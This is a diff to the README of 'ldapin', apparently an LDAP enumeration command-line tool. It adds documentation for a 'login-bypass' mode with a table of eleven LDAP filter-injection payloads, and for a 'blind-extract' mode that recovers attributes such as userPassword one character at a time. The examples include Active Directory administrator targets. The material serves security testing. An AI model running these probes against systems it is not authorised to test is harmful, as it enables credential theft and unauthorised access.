@@ -52,6 +52,10 @@ Options:
   -c, --object-class <NAME>   Limit to a specific object class (with -m object-classes)
   -m, --mode <MODE>           What to show: attributes, object-classes, both [default: attributes]
   -o, --output <OUTPUT>       Output format: table, json, csv [default: table]
+  -b, --base-dn <BASE_DN>     Base DN to search under (required for --mode login-bypass)
+      --user-attr <ATTR>      User attribute name for login-bypass probes [default: uid]
+      --pass-attr <ATTR>      Password attribute name for login-bypass probes [default: userPassword]
+  -u, --target-user <USER>    Target username for login-bypass probes
       --starttls              Upgrade connection with STARTTLS
       --insecure              Skip TLS certificate verification
   -h, --help                  Print help
@@ -148,6 +152,92 @@ Export everything to JSON:
 
 ```bash
 ldapin -H ldap://ldap.forumsys.com -m both -o json
+```
+
+## Login bypass testing
+
+The `login-bypass` mode probes an LDAP server for filter-injection vulnerabilities.
+It constructs 11 payloads derived from known LDAP injection techniques and reports
+which ones return entries — the same result a vulnerable web application would produce
+if it built its authentication filter from unsanitised user input.
+
+```bash
+# Probe with anonymous bind, any-user payloads
+ldapin -H ldap://target -m login-bypass -b dc=example,dc=com
+
+# Probe for a specific account
+ldapin -H ldap://target -m login-bypass -b dc=example,dc=com -u einstein
+
+# Active Directory — use sAMAccountName and unicodePwd
+ldapin -H ldap://dc.corp -m login-bypass -b dc=corp,dc=local \
+  --user-attr sAMAccountName --pass-attr unicodePwd -u administrator
+
+# JSON output for scripting
+ldapin -H ldap://target -m login-bypass -b dc=example,dc=com -o json
+```
+
+Payloads tested:
+
+| Payload | Filter template |
+| --- | --- |
+| `wildcard-both` | `(&(uid=*)(userPassword=*))` |
+| `wildcard-password` | `(&(uid=TARGET)(userPassword=*))` |
+| `negate-password` | `(&(uid=TARGET)(!(userPassword=void)))` |
+| `or-always-true` | `(\|(uid=*)(uid=TARGET))` |
+| `double-or-inject` | `(\|(uid=*)(uid=*))` |
+| `and-tautology` | `(&(uid=TARGET)(\|(userPassword=*)(userPassword=*)))` |
+| `objectclass-wildcard` | `(&(uid=*)(objectClass=*))` |
+| `not-nonexistent` | `(!(&(uid=__ldapin_nonexistent__)))` |
+| `empty-password` | `(&(uid=TARGET)(userPassword=))` |
+| `wildcard-user-prefix` | `(&(uid=TARGET*)(userPassword=*))` |
+| `bare-user-wildcard` | `(uid=*)` |
+
+### ForumSys example
+
+```bash
+ldapin -H ldap://ldap.forumsys.com -m login-bypass -b dc=example,dc=com
+```
+
+## Blind attribute extraction
+
+The `blind-extract` mode recovers the value of any readable attribute one character
+at a time by repeatedly probing with wildcard-suffix filters:
+
+```text
+(&(uid=TARGET)(mail=a*))   → no entries
+(&(uid=TARGET)(mail=e*))   → entries found → 'e'
+(&(uid=TARGET)(mail=ei*))  → entries found → 'ei'
+...
+```
+
+This is the direct-LDAP equivalent of the classic blind injection loop used against
+vulnerable web applications that build LDAP filters from not sanitized input.
+
+Required flags: `-b / --base-dn`, `-u / --target-user`, `--extract-attr`.
+
+```bash
+# Extract the mail attribute for user "einstein"
+ldapin -H ldap://target -m blind-extract \
+  -b dc=example,dc=com -u einstein --extract-attr mail
+
+# Extract with a custom character set
+ldapin -H ldap://target -m blind-extract \
+  -b dc=example,dc=com -u jdoe --extract-attr userPassword \
+  --charset 'abcdefghijklmnopqrstuvwxyz0123456789!@#$'
+
+# JSON output
+ldapin -H ldap://target -m blind-extract \
+  -b dc=example,dc=com -u einstein --extract-attr mail -o json
+```
+
+Progress is written to stderr as characters are found, so stdout stays clean for
+piping or `-o json` / `-o csv` use.
+
+### ForumSys example
+
+```bash
+ldapin -H ldap://ldap.forumsys.com -m blind-extract \
+  -b dc=example,dc=com -u einstein --extract-attr mail
 ```
 
 ## Development
